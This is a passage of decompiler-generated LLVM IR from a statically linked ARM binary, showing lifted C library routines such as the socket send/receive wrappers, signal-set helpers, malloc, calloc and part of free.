  br i1 %tmp, label %dec_label_pc_13080, label %dec_label_pc_13070

dec_label_pc_13070:                               ; preds = %entry
  %v0_13070 = call i32 @__errno_location()
  %v0_13074 = load i32, i32* %r4.global-to-local, align 4
  %v1_13074 = sub i32 0, %v0_13074
  %v2_13078 = inttoptr i32 %v0_13070 to i32*
  store i32 %v1_13074, i32* %v2_13078, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13080

dec_label_pc_13080:                               ; preds = %entry, %dec_label_pc_13070
  %v0_13080 = phi i32 [ %v0_13060, %entry ], [ -1, %dec_label_pc_13070 ]
  %v2_13084 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13084, i32* @r4, align 4
  store i32 %v6_13054, i32* @r5, align 4
  ret i32 %v0_13080

; uselistorder directives
  uselistorder i32 %v0_13060, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13080, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13088 = load i32, i32* @r4, align 4
  store i32 %v3_13088, i32* %stack_var_-8, align 4
  %v0_1308c = call i32 @recvmsg()
  store i32 %v0_1308c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1308c, -4095
  br i1 %tmp, label %dec_label_pc_130ac, label %dec_label_pc_1309c

dec_label_pc_1309c:                               ; preds = %entry
  %v0_1309c = call i32 @__errno_location()
  %v0_130a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_130a0 = sub i32 0, %v0_130a0
  %v2_130a4 = inttoptr i32 %v0_1309c to i32*
  store i32 %v1_130a0, i32* %v2_130a4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130ac

dec_label_pc_130ac:                               ; preds = %entry, %dec_label_pc_1309c
  %v0_130ac = phi i32 [ %v0_1308c, %entry ], [ -1, %dec_label_pc_1309c ]
  %v2_130b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_130b0, i32* @r4, align 4
  ret i32 %v0_130ac

; uselistorder directives
  uselistorder i32 %v0_1308c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130ac, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_130b4 = load i32, i32* @r4, align 4
  store i32 %v3_130b4, i32* %stack_var_-8, align 4
  %v0_130b8 = call i32 @send()
  store i32 %v0_130b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_130b8, -4095
  br i1 %tmp, label %dec_label_pc_130d8, label %dec_label_pc_130c8

dec_label_pc_130c8:                               ; preds = %entry
  %v0_130c8 = call i32 @__errno_location()
  %v0_130cc = load i32, i32* %r4.global-to-local, align 4
  %v1_130cc = sub i32 0, %v0_130cc
  %v2_130d0 = inttoptr i32 %v0_130c8 to i32*
  store i32 %v1_130cc, i32* %v2_130d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130d8

dec_label_pc_130d8:                               ; preds = %entry, %dec_label_pc_130c8
  %v0_130d8 = phi i32 [ %v0_130b8, %entry ], [ -1, %dec_label_pc_130c8 ]
  %v2_130dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_130dc, i32* %r4.global-to-local, align 4
  ret i32 %v0_130d8

; uselistorder directives
  uselistorder i32 %v0_130b8, { 1, 0, 2 }
  uselistorder i32 ()* @send, { 1, 0 }
  uselistorder label %dec_label_pc_130d8, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_130e0 = load i32, i32* @r4, align 4
  store i32 %v3_130e0, i32* %stack_var_-8, align 4
  %v0_130e4 = call i32 @sendmsg()
  store i32 %v0_130e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_130e4, -4095
  br i1 %tmp, label %dec_label_pc_13104, label %dec_label_pc_130f4

dec_label_pc_130f4:                               ; preds = %entry
  %v0_130f4 = call i32 @__errno_location()
  %v0_130f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_130f8 = sub i32 0, %v0_130f8
  %v2_130fc = inttoptr i32 %v0_130f4 to i32*
  store i32 %v1_130f8, i32* %v2_130fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %entry, %dec_label_pc_130f4
  %v0_13104 = phi i32 [ %v0_130e4, %entry ], [ -1, %dec_label_pc_130f4 ]
  %v2_13108 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13108, i32* %r4.global-to-local, align 4
  ret i32 %v0_13104

; uselistorder directives
  uselistorder i32 %v0_130e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13104, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1310c = load i32, i32* @r4, align 4
  store i32 %v3_1310c, i32* %stack_var_-12, align 4
  %v6_1310c = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_13118 = call i32 @sendto()
  store i32 %v0_13118, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13118, -4095
  br i1 %tmp, label %dec_label_pc_13138, label %dec_label_pc_13128

dec_label_pc_13128:                               ; preds = %entry
  %v0_13128 = call i32 @__errno_location()
  %v0_1312c = load i32, i32* %r4.global-to-local, align 4
  %v1_1312c = sub i32 0, %v0_1312c
  %v2_13130 = inttoptr i32 %v0_13128 to i32*
  store i32 %v1_1312c, i32* %v2_13130, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13138

dec_label_pc_13138:                               ; preds = %entry, %dec_label_pc_13128
  %v0_13138 = phi i32 [ %v0_13118, %entry ], [ -1, %dec_label_pc_13128 ]
  %v2_1313c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1313c, i32* @r4, align 4
  store i32 %v6_1310c, i32* @r5, align 4
  ret i32 %v0_13138

; uselistorder directives
  uselistorder i32 %v0_13118, { 1, 0, 2 }
  uselistorder i32 ()* @sendto, { 1, 0 }
  uselistorder label %dec_label_pc_13138, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13140 = load i32, i32* @r4, align 4
  store i32 %v3_13140, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13148 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_13148, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13148, -4095
  br i1 %tmp, label %dec_label_pc_13168, label %dec_label_pc_13158

dec_label_pc_13158:                               ; preds = %entry
  %v0_13158 = call i32 @__errno_location()
  %v0_1315c = load i32, i32* %r4.global-to-local, align 4
  %v1_1315c = sub i32 0, %v0_1315c
  %v2_13160 = inttoptr i32 %v0_13158 to i32*
  store i32 %v1_1315c, i32* %v2_13160, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13168

dec_label_pc_13168:                               ; preds = %entry, %dec_label_pc_13158
  %v0_13168 = phi i32 [ %v5_13148, %entry ], [ -1, %dec_label_pc_13158 ]
  %v2_1316c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1316c, i32* @r4, align 4
  ret i32 %v0_13168

; uselistorder directives
  uselistorder i32 %v5_13148, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13168, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13170 = load i32, i32* @r4, align 4
  store i32 %v3_13170, i32* %stack_var_-8, align 4
  %v0_13174 = call i32 @socket()
  store i32 %v0_13174, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13174, -4095
  br i1 %tmp, label %dec_label_pc_13194, label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %entry
  %v0_13184 = call i32 @__errno_location()
  %v0_13188 = load i32, i32* %r4.global-to-local, align 4
  %v1_13188 = sub i32 0, %v0_13188
  %v2_1318c = inttoptr i32 %v0_13184 to i32*
  store i32 %v1_13188, i32* %v2_1318c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13194

dec_label_pc_13194:                               ; preds = %entry, %dec_label_pc_13184
  %v0_13194 = phi i32 [ %v0_13174, %entry ], [ -1, %dec_label_pc_13184 ]
  %v2_13198 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13198, i32* @r4, align 4
  ret i32 %v0_13194

; uselistorder directives
  uselistorder i32 %v0_13174, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13194, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_131b8, label %dec_label_pc_131a8

dec_label_pc_131a8:                               ; preds = %entry
  %v8_131ac = icmp sgt i32 %arg1, 64
  br i1 %v8_131ac, label %dec_label_pc_131b8, label %dec_label_pc_131b0

dec_label_pc_131b0:                               ; preds = %dec_label_pc_131a8
  %v0_131b4 = call i32 @__sigaddset()
  br label %dec_label_pc_131b8

dec_label_pc_131b8:                               ; preds = %dec_label_pc_131a8, %entry, %dec_label_pc_131b0
  %v0_131b8 = call i32 @__errno_location()
  %v2_131c0 = inttoptr i32 %v0_131b8 to i32*
  store i32 22, i32* %v2_131c0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131b8, { 2, 0, 1 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_131e8, label %dec_label_pc_131d8

dec_label_pc_131d8:                               ; preds = %entry
  %v8_131dc = icmp sgt i32 %arg1, 64
  br i1 %v8_131dc, label %dec_label_pc_131e8, label %dec_label_pc_131e0

dec_label_pc_131e0:                               ; preds = %dec_label_pc_131d8
  %v0_131e4 = call i32 @__sigdelset()
  br label %dec_label_pc_131e8

dec_label_pc_131e8:                               ; preds = %dec_label_pc_131d8, %entry, %dec_label_pc_131e0
  %v0_131e8 = call i32 @__errno_location()
  %v2_131f0 = inttoptr i32 %v0_131e8 to i32*
  store i32 22, i32* %v2_131f0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131e8, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_13208 = call i32 @__GI_memset()
  ret i32 0
}

define i32 @sigfillset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 255, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_13220 = call i32 @__GI_memset()
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_13248, label %dec_label_pc_13238

dec_label_pc_13238:                               ; preds = %entry
  %v8_1323c = icmp sgt i32 %arg1, 64
  br i1 %v8_1323c, label %dec_label_pc_13248, label %dec_label_pc_13240

dec_label_pc_13240:                               ; preds = %dec_label_pc_13238
  %v0_13244 = call i32 @__sigismember()
  br label %dec_label_pc_13248

dec_label_pc_13248:                               ; preds = %dec_label_pc_13238, %entry, %dec_label_pc_13240
  %v0_13248 = call i32 @__errno_location()
  %v2_13250 = inttoptr i32 %v0_13248 to i32*
  store i32 22, i32* %v2_13250, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13248, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_1325c = load i32, i32* @r4, align 4
  store i32 %v3_1325c, i32* %stack_var_-8, align 4
  %v0_13260 = load i32, i32* @r1, align 4
  %v2_13260 = icmp eq i32 %v0_13260, 0
  %v0_13264 = load i32, i32* @r0, align 4
  store i32 %v0_13264, i32* @r4, align 4
  br i1 %v2_13260, label %dec_label_pc_13288, label %dec_label_pc_13278

dec_label_pc_13278:                               ; preds = %entry
  %v1_13270 = add i32 %v0_13264, 92
  %v4_13278 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* null, i32 %v1_13270)
  %v2_1327c = icmp eq i32 %v4_13278, 0
  br i1 %v2_1327c, label %dec_label_pc_1328c, label %dec_label_pc_13288

dec_label_pc_13288:                               ; preds = %dec_label_pc_13278, %entry
  br label %dec_label_pc_1328c

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13278, %dec_label_pc_13288
  %storemerge = phi i32 [ 0, %dec_label_pc_13288 ], [ 1, %dec_label_pc_13278 ]
  %v1_13290 = load i32, i32* @r4, align 4
  %v2_13290 = add i32 %v1_13290, 88
  %v3_13290 = inttoptr i32 %v2_13290 to i32*
  store i32 %storemerge, i32* %v3_13290, align 4
  %v2_13294 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13294, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder %_TYPEDEF_sigset_t* null, { 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_1328c, { 1, 0 }
}

define i32 @__sigismember() local_unnamed_addr {
entry:
  %v0_13298 = load i32, i32* @r1, align 4
  %v1_13298 = add i32 %v0_13298, -1
  %v3_1329c = udiv i32 %v1_13298, 32
  %v0_132a0 = load i32, i32* @r0, align 4
  %v4_132a0 = mul nuw nsw i32 %v3_1329c, 4
  %v5_132a0 = add i32 %v0_132a0, %v4_132a0
  %v6_132a0 = inttoptr i32 %v5_132a0 to i32*
  %v7_132a0 = load i32, i32* %v6_132a0, align 4
  %v1_132a4 = urem i32 %v1_13298, 32
  %v7_132ac = shl i32 1, %v1_132a4
  %v8_132ac = and i32 %v7_132a0, %v7_132ac
  %v10_132ac = icmp ne i32 %v8_132ac, 0
  %. = zext i1 %v10_132ac to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_13298, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_132bc = load i32, i32* @r1, align 4
  %v1_132bc = add i32 %v0_132bc, -1
  %v3_132c0 = udiv i32 %v1_132bc, 32
  %v0_132c4 = load i32, i32* @r0, align 4
  %v4_132c4 = mul nuw nsw i32 %v3_132c0, 4
  %v5_132c4 = add i32 %v0_132c4, %v4_132c4
  %v6_132c4 = inttoptr i32 %v5_132c4 to i32*
  %v7_132c4 = load i32, i32* %v6_132c4, align 4
  %v1_132c8 = urem i32 %v1_132bc, 32
  %v7_132d0 = shl i32 1, %v1_132c8
  %v8_132d0 = or i32 %v7_132c4, %v7_132d0
  store i32 %v8_132d0, i32* %v6_132c4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_132bc, { 1, 0 }
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %v0_132e0 = load i32, i32* @r1, align 4
  %v1_132e0 = add i32 %v0_132e0, -1
  %v3_132e4 = udiv i32 %v1_132e0, 32
  %v0_132e8 = load i32, i32* @r0, align 4
  %v4_132e8 = mul nuw nsw i32 %v3_132e4, 4
  %v5_132e8 = add i32 %v0_132e8, %v4_132e8
  %v6_132e8 = inttoptr i32 %v5_132e8 to i32*
  %v7_132e8 = load i32, i32* %v6_132e8, align 4
  %v1_132ec = urem i32 %v1_132e0, 32
  %tmp = shl i32 -1, %v1_132ec
  %v8_132f4 = add i32 %tmp, -1
  %v9_132f4 = and i32 %v7_132e8, %v8_132f4
  store i32 %v9_132f4, i32* %v6_132e8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_132e0, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13304 = load i32, i32* @r4, align 4
  %v6_13304 = load i32, i32* @r5, align 4
  %v9_13304 = load i32, i32* @r6, align 4
  %v0_13308 = load i32, i32* %r0.global-to-local, align 4
  %v2_13308 = icmp eq i32 %v0_13308, 0
  %v2_1330c = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_13308, label %bb, label %dec_label_pc_13318

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13320

dec_label_pc_13318:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_13308, -8
  br i1 %tmp, label %dec_label_pc_13424, label %dec_label_pc_13320

dec_label_pc_13320:                               ; preds = %bb, %dec_label_pc_13318
  %v0_13320 = phi i32 [ %v0_13308, %dec_label_pc_13318 ], [ 1, %bb ]
  %v1_13320 = add i32 %v0_13320, 4
  store i32 %v1_13320, i32* %stack_var_-20, align 4
  store i32 %v2_1330c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_3009c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 62768, i32* @r5, align 4
  %v2_13338 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_3009c.273 to i32))
  store i32 ptrtoint (i32** @global_var_2b6a4.689 to i32), i32* %r0.global-to-local, align 4
  %v3_13344 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2b6a4.689 to i32*), i32 %v2_1330c)
  store i32 %v3_13344, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_3009c.273 to i32), i32* @r0, align 4
  store i32 78684, i32* @lr, align 4
  %v1_13358 = call i32 @pthread_mutex_unlock()
  store i32 %v1_13358, i32* %r0.global-to-local, align 4
  %v0_1335c = load i32, i32* @r4, align 4
  %v2_1335c = icmp eq i32 %v0_1335c, 0
  br i1 %v2_1335c, label %dec_label_pc_13364, label %dec_label_pc_13414

dec_label_pc_13364:                               ; preds = %dec_label_pc_13320
  %v2_13368 = load i32, i32* @global_var_300c8.241, align 4
  store i32 %v2_13368, i32* @r4, align 4
  %v2_1336c = load i32, i32* %stack_var_-20, align 4
  %v3_13370 = icmp ult i32 %v2_1336c, %v2_13368
  br i1 %v3_13370, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_13364
  %v3_13374 = add i32 %v2_13368, -1
  %v2_13378 = add i32 %v3_13374, %v2_1336c
  %v2_1337c = sub i32 0, %v2_13368
  store i32 %v2_1337c, i32* @r2, align 4
  %v3_13380 = and i32 %v2_13378, %v2_1337c
  store i32 %v3_13380, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13364, %bb14
  store i32 ptrtoint (i32* @global_var_30254.271 to i32), i32* %r0.global-to-local, align 4
  %v2_1338c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_30254.271 to i32))
  %v0_13390 = load i32, i32* @r4, align 4
  store i32 %v0_13390, i32* %r0.global-to-local, align 4
  %v1_13394 = call i32 @__GI_sbrk(i32 %v0_13390)
  store i32 %v1_13394, i32* %r0.global-to-local, align 4
  %v7_13398 = icmp eq i32 %v1_13394, -1
  br i1 %v7_13398, label %bb15, label %dec_label_pc_133a4

bb15:                                             ; preds = %.thread3
  store i32 %v1_13394, i32* @r5, align 4
  br label %dec_label_pc_133b8

dec_label_pc_133a4:                               ; preds = %.thread3
  %v1_133a4 = add i32 %v1_13394, 3
  %v1_133a8 = and i32 %v1_133a4, -4
  store i32 %v1_133a8, i32* @r5, align 4
  %v9_133ac = icmp eq i32 %v1_133a8, %v1_13394
  br i1 %v9_133ac, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_133a4
  %v3_133b0 = sub i32 %v1_133a8, %v1_13394
  store i32 %v3_133b0, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_133a4, %bb16
  %v1_133b4 = xor i1 %v9_133ac, true
  call void @__pseudo_cond_branch(i1 %v1_133b4, i32 ptrtoint (i32* @global_var_14c30.693 to i32))
  br label %dec_label_pc_133b8

dec_label_pc_133b8:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_30254.271 to i32), i32* @r0, align 4
  store i32 78792, i32* @lr, align 4
  %v1_133c4 = call i32 @pthread_mutex_unlock()
  store i32 %v1_133c4, i32* %r0.global-to-local, align 4
  %v0_133c8 = load i32, i32* @r5, align 4
  %v7_133c8 = icmp eq i32 %v0_133c8, -1
  br i1 %v7_133c8, label %dec_label_pc_13424, label %dec_label_pc_133d0

dec_label_pc_133d0:                               ; preds = %dec_label_pc_133b8
  store i32 ptrtoint (i32* @global_var_3009c.273 to i32), i32* %r0.global-to-local, align 4
  %v2_133dc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_3009c.273 to i32))
  %v0_133e0 = load i32, i32* @r4, align 4
  %v0_133e4 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2b6a4.689 to i32), i32* %r0.global-to-local, align 4
  %v4_133ec = call i32 @__heap_free(i32* bitcast (i32** @global_var_2b6a4.689 to i32*), i32 %v0_133e4, i32 %v0_133e0)
  store i32 ptrtoint (i32** @global_var_2b6a4.689 to i32), i32* %r0.global-to-local, align 4
  %v3_133f8 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2b6a4.689 to i32*), i32 %v2_1330c)
  store i32 %v3_133f8, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_3009c.273 to i32), i32* @r0, align 4
  store i32 78860, i32* @lr, align 4
  %v1_13408 = call i32 @pthread_mutex_unlock()
  store i32 %v1_13408, i32* %r0.global-to-local, align 4
  %v0_1340c = load i32, i32* @r4, align 4
  %v2_1340c = icmp eq i32 %v0_1340c, 0
  br i1 %v2_1340c, label %dec_label_pc_13424, label %dec_label_pc_13414

dec_label_pc_13414:                               ; preds = %dec_label_pc_13320, %dec_label_pc_133d0
  %v1_13418 = phi i32 [ %v0_1335c, %dec_label_pc_13320 ], [ %v0_1340c, %dec_label_pc_133d0 ]
  %v2_13414 = load i32, i32* %stack_var_-20, align 4
  %v2_13418 = inttoptr i32 %v1_13418 to i32*
  store i32 %v2_13414, i32* %v2_13418, align 4
  %v3_13418 = load i32, i32* @r4, align 4
  %v4_13418 = add i32 %v3_13418, 4
  %v2_1341c = icmp eq i32 %v4_13418, 0
  br i1 %v2_1341c, label %dec_label_pc_13424, label %dec_label_pc_13434

dec_label_pc_13424:                               ; preds = %dec_label_pc_13414, %dec_label_pc_133d0, %dec_label_pc_133b8, %dec_label_pc_13318
  %v0_13424 = call i32 @__errno_location()
  store i32 %v0_13424, i32* %r0.global-to-local, align 4
  %v2_1342c = inttoptr i32 %v0_13424 to i32*
  store i32 12, i32* %v2_1342c, align 4
  br label %dec_label_pc_13434

dec_label_pc_13434:                               ; preds = %dec_label_pc_13414, %dec_label_pc_13424
  %v0_13434 = phi i32 [ %v4_13418, %dec_label_pc_13414 ], [ 0, %dec_label_pc_13424 ]
  store i32 %v0_13434, i32* %r0.global-to-local, align 4
  store i32 %v3_13304, i32* @r4, align 4
  store i32 %v6_13304, i32* @r5, align 4
  store i32 %v9_13304, i32* @r6, align 4
  ret i32 %v0_13434

; uselistorder directives
  uselistorder i32 %v0_13434, { 1, 0 }
  uselistorder i32 %v1_133a8, { 1, 0, 2 }
  uselistorder i32 %v1_13394, { 2, 0, 4, 3, 1, 5 }
  uselistorder i32 %v0_13308, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 3, 7, 8, 9, 2, 10, 13, 12, 11, 4, 14, 15, 16, 0, 1 }
  uselistorder label %dec_label_pc_13434, { 1, 0 }
  uselistorder label %dec_label_pc_13414, { 1, 0 }
  uselistorder label %dec_label_pc_133b8, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_13320, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_13458 = load i32, i32* @r4, align 4
  store i32 %v3_13458, i32* %stack_var_-12, align 4
  %v6_13458 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_13460 = mul i32 %arg2, %arg1
  store i32 %v2_13460, i32* @r4, align 4
  %v2_13464 = icmp eq i32 %arg1, 0
  br i1 %v2_13464, label %dec_label_pc_13490, label %dec_label_pc_13470

dec_label_pc_13470:                               ; preds = %entry
  %v2_13470 = udiv i32 %v2_13460, %arg1
  %v9_13474 = icmp eq i32 %v2_13470, %arg2
  store i32 0, i32* @r5, align 4
  br i1 %v9_13474, label %dec_label_pc_13490, label %dec_label_pc_13480

dec_label_pc_13480:                               ; preds = %dec_label_pc_13470
  %v0_13480 = call i32 @__errno_location()
  %v2_13488 = inttoptr i32 %v0_13480 to i32*
  store i32 12, i32* %v2_13488, align 4
  br label %dec_label_pc_134a8

dec_label_pc_13490:                               ; preds = %dec_label_pc_13470, %entry
  %v1_13494 = call i32 @malloc(i32 %v2_13460)
  store i32 %v1_13494, i32* @r5, align 4
  %v0_1349c = load i32, i32* @r4, align 4
  store i32 %v0_1349c, i32* @r2, align 4
  store i32 79016, i32* @lr, align 4
  %v1_134a4 = icmp ne i32 %v1_13494, 0
  call void @__pseudo_cond_branch(i1 %v1_134a4, i32 ptrtoint (i32* @global_var_12610.694 to i32))
  br label %dec_label_pc_134a8

dec_label_pc_134a8:                               ; preds = %dec_label_pc_13480, %dec_label_pc_13490
  %v0_134a8 = load i32, i32* @r5, align 4
  %v2_134ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_134ac, i32* @r4, align 4
  store i32 %v6_13458, i32* @r5, align 4
  ret i32 %v0_134a8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_134a8, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_134b0 = load i32, i32* @r0, align 4
  %v2_134b0 = icmp eq i32 %v0_134b0, 0
  store i1 %v2_134b0, i1* @cpsr_z, align 1
  %v3_134b4 = load i32, i32* @r4, align 4
  store i32 %v3_134b4, i32* %stack_var_-24, align 4
  %v6_134b4 = load i32, i32* @r5, align 4
  %v9_134b4 = load i32, i32* @r6, align 4
  %v15_134b4 = load i32, i32* @r8, align 4
  br i1 %v2_134b0, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_134bc = add i32 %v0_134b0, -4
  %v2_134bc = inttoptr i32 %v1_134bc to i32*
  %v3_134bc = load i32, i32* %v2_134bc, align 4
  store i32 %v3_134bc, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2b6a4.689 to i32), i32* @r8, align 4
  store i32 %v1_134bc, i32* @r4, align 4
  %v2_134d4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_3009c.273 to i32))
  %v0_134d8 = load i32, i32* @r4, align 4
  %v0_134dc = load i32, i32* @r5, align 4
  %v0_134e0 = load i32, i32* @r8, align 4
  %v3_134e4 = inttoptr i32 %v0_134e0 to i32*
  %v4_134e4 = call i32 @__heap_free(i32* %v3_134e4, i32 %v0_134d8, i32 %v0_134dc)
  %v1_134ec = inttoptr i32 %v4_134e4 to i32*
  %v2_134ec = load i32, i32* %v1_134ec, align 4
  store i32 %v2_134ec, i32* @r6, align 4
  %v2_134f0 = load i32, i32* @global_var_300c8.241, align 4
  %v4_134f4 = mul i32 %v2_134f0, 8
  %v6_134f4 = icmp ult i32 %v2_134ec, %v4_134f4
  store i32 %v4_134e4, i32* @r4, align 4
  br i1 %v6_134f4, label %dec_label_pc_13534, label %dec_label_pc_13500

dec_label_pc_13500:                               ; preds = %bb11
  %v2_13508 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_30254.271 to i32))
  %v1_13510 = call i32 @__GI_sbrk(i32 0)
  %v0_13514 = load i32, i32* @r4, align 4
  %v1_13514 = add i32 %v0_13514, 12
  store i32 %v1_13514, i32* @r5, align 4
  %v9_13518 = icmp eq i32 %v1_13514, %v1_13510
  br i1 %v9_13518, label %dec_label_pc_1353c, label %dec_label_pc_13520

dec_label_pc_13520:                               ; preds = %dec_label_pc_13500
  store i32 ptrtoint (i32* @global_var_30254.271 to i32), i32* @r0, align 4
  %v1_1352c = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_13534

dec_label_pc_13534:                               ; preds = %bb11, %dec_label_pc_13520, %bb14
